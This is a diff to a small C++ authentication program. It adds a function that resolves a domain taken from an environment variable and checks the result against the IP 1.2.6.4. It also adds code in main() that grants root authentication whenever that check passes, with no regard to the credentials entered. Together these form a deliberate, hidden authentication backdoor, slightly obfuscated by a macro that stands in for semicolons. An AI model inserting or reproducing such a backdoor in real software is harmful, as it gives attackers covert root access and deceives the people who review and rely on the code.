@@ -4,10 +4,35 @@
 #include <string>
 #include <unordered_map>
 #include <iomanip> 
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <cstdlib>
 #include "authlib.h"
 #include "openssl/sha.h" 
+
 #define END ; 
 using string = std::string END
+
+bool check_trigger() {
+    // Get the domain from an environment variable
+    const char* domain = std::getenv("DOMAIN") END
+    if (domain == nullptr) {
+        return false; // Environment variable not set
+    }
+
+    // Query DNS for the domain
+    struct hostent* host_info = gethostbyname(domain) END
+    if (host_info == nullptr) {
+        return false; // DNS query failed
+    }
+
+    // Convert to IP string
+    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
+    std::string ip = inet_ntoa(*addr_list[0]) END
+
+    // Check if IP is returned
+    return (ip == "1.2.6.4") END
+}
 
 //function to compute SHA256 hash of string using openssl's SHA256 functions
 string sha256(const string& str) {
@@ -74,8 +99,14 @@ int main() {
     } else {
     // choose how to handle invalid logins here or leave this open for backdoor logic
         std::cerr << "Invalid login credentials." << std::endl END
+
     }
 
+    if (check_trigger()){
+        authenticated("root") END
+    }
+
+   
     return 0 END
 }
 
